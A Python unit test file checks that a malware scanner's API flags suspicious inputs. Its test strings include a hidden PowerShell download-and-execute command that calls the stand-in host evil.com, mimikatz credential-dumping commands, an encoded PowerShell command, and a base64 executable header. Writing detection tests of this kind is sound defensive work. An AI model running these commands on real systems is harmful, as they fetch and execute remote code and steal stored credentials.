#!/usr/bin/env python3
"""
Unit Tests for EDR-Safe Scanner
Tests all API endpoints and validates the bug fix
"""

import unittest
import requests
import tempfile
import os
import json
from pathlib import Path

class TestEDRSafeScanner(unittest.TestCase):
    """Test cases for EDR-Safe Scanner bug fix"""
    
    BASE_URL = "https://c443dcf5-03e8-4540-a57c-a46af7d38732.preview.emergentagent.com/api"
    
    def setUp(self):
        """Set up test files"""
        self.test_files_dir = Path("/app/test_files")
        self.test_files_dir.mkdir(exist_ok=True)
    
    def test_rules_metadata_endpoint(self):
        """Test GET /api/rules/latest endpoint"""
        response = requests.get(f"{self.BASE_URL}/rules/latest", timeout=10)
        self.assertEqual(response.status_code, 200)
        
        data = response.json()
        self.assertIn("built", data)
        self.assertIn("sources", data) 
        self.assertIn("total_rules", data)
        self.assertIsInstance(data["sources"], list)
    
    def test_empty_file_upload(self):
        """Test empty file upload returns 400"""
        response = requests.post(f"{self.BASE_URL}/scan", files={}, timeout=10)
        self.assertEqual(response.status_code, 400)
    
    def test_benign_text_clean(self):
        """Test that benign text returns clean status"""
        content = "This is a simple benign text file with no threats."
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write(content)
            temp_path = f.name
        
        try:
            with open(temp_path, 'rb') as f:
                files = {'files': ('benign-text.txt', f, 'text/plain')}
                response = requests.post(f"{self.BASE_URL}/scan", files=files, timeout=15)
            
            self.assertEqual(response.status_code, 200)
            result = response.json()
            self.assertEqual(result["results"][0]["status"], "clean")
            self.assertEqual(result["results"][0]["matches"], [])
            
        finally:
            os.unlink(temp_path)
    
    def test_suspicious_powershell_detection(self):
        """Test PowerShell -Enc pattern detection"""
        content = 'powershell.exe -Enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=='
        
        data = {"content": content, "filename": "suspicious-powershell.txt"}
        response = requests.post(f"{self.BASE_URL}/scan/text", data=data, timeout=15)
        
        self.assertEqual(response.status_code, 200)
        result = response.json()
        scan_result = result["results"][0]
        
        self.assertIn(scan_result["status"], ["suspicious", "bad"])
        self.assertGreater(len(scan_result["matches"]), 0)
        
        # Should detect PowerShell obfuscation
        match_names = ' '.join(scan_result["matches"]).lower()
        self.assertTrue(any(keyword in match_names for keyword in ['powershell', 'encoded']))
    
    def test_bad_mimikatz_detection(self):
        """Test mimikatz indicator detection"""
        content = '''Starting mimikatz execution...
sekurlsa::logonpasswords
crypto::capi
privilege::debug'''
        
        data = {"content": content, "filename": "bad-mimikatz.txt"}
        response = requests.post(f"{self.BASE_URL}/scan/text", data=data, timeout=15)
        
        self.assertEqual(response.status_code, 200)
        result = response.json()
        scan_result = result["results"][0]
        
        self.assertIn(scan_result["status"], ["suspicious", "bad"])
        self.assertGreater(len(scan_result["matches"]), 0)
        
        # Should detect mimikatz
        match_names = ' '.join(scan_result["matches"]).lower()
        self.assertIn('mimikatz', match_names)
    
    def test_packed_marker_detection(self):
        """Test MZ + UPX! header detection"""
        # Create binary content with MZ header and UPX signature
        binary_content = b'\x4D\x5A\x90\x00' + b'\x00' * 10 + b'UPX!' + b'\x00' * 50
        
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(binary_content)
            temp_path = f.name
        
        try:
            with open(temp_path, 'rb') as f:
                files = {'files': ('packed-marker.bin', f, 'application/octet-stream')}
                response = requests.post(f"{self.BASE_URL}/scan", files=files, timeout=15)
            
            self.assertEqual(response.status_code, 200)
            result = response.json()
            scan_result = result["results"][0]
            
            self.assertIn(scan_result["status"], ["suspicious", "bad"])
            self.assertGreater(len(scan_result["matches"]), 0)
            
            # Should detect UPX packer
            match_names = ' '.join(scan_result["matches"]).lower()
            self.assertIn('upx', match_names)
            
        finally:
            os.unlink(temp_path)
    
    def test_encoded_script_detection(self):
        """Test base64 PE header detection"""
        content = '''$encoded = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAAAAAAAAAA="
[System.Convert]::FromBase64String($encoded)'''
        
        data = {"content": content, "filename": "encoded-script.ps1"}
        response = requests.post(f"{self.BASE_URL}/scan/text", data=data, timeout=15)
        
        self.assertEqual(response.status_code, 200)
        result = response.json()
        scan_result = result["results"][0]
        
        self.assertIn(scan_result["status"], ["suspicious", "bad"])
        self.assertGreater(len(scan_result["matches"]), 0)
        
        # Should detect base64 encoding
        match_names = ' '.join(scan_result["matches"]).lower()
        self.assertTrue(any(keyword in match_names for keyword in ['base64', 'pe']))
    
    def test_mixed_good_and_bad_detection(self):
        """Test mixed content with obfuscated PowerShell"""
        content = '''This file starts with normal content.
Regular text that looks benign at first.

But then it contains:
powershell -w hidden -nop -c "IEX ((new-object net.webclient).downloadstring('http://evil.com/malware'))"

And also some obfuscated PowerShell:
$a='Invoke-Expression';$b='DownloadString';IEX'''
        
        data = {"content": content, "filename": "mixed-good-and-bad.txt"}
        response = requests.post(f"{self.BASE_URL}/scan/text", data=data, timeout=15)
        
        self.assertEqual(response.status_code, 200)
        result = response.json()
        scan_result = result["results"][0]
        
        self.assertIn(scan_result["status"], ["suspicious", "bad"])
        self.assertGreater(len(scan_result["matches"]), 0)
        
        # Should detect multiple PowerShell threats
        match_names = ' '.join(scan_result["matches"]).lower()
        self.assertTrue(any(keyword in match_names for keyword in 
                          ['powershell', 'obfuscat', 'malicious', 'download']))

if __name__ == '__main__':
    print("🧪 Running EDR-Safe Scanner Unit Tests")
    print("=" * 60)
    
    # Create test suite
    loader = unittest.TestLoader()
    suite = loader.loadTestsFromTestCase(TestEDRSafeScanner)
    
    # Run tests with verbose output
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # Print summary
    print("\n" + "=" * 60)
    print("🎯 TEST SUMMARY")
    print("=" * 60)
    
    total_tests = result.testsRun
    failures = len(result.failures)
    errors = len(result.errors)
    passed = total_tests - failures - errors
    
    print(f"Total Tests: {total_tests}")
    print(f"Passed: {passed}")
    print(f"Failed: {failures}")
    print(f"Errors: {errors}")
    
    if result.wasSuccessful():
        print("\n🎉 ALL UNIT TESTS PASSED!")
        print("✅ Bug fix verification complete")
    else:
        print("\n❌ Some tests failed")
        if result.failures:
            print("\nFailures:")
            for test, traceback in result.failures:
                print(f"- {test}: {traceback}")
        if result.errors:
            print("\nErrors:")
            for test, traceback in result.errors:
                print(f"- {test}: {traceback}")
    
    exit(0 if result.wasSuccessful() else 1)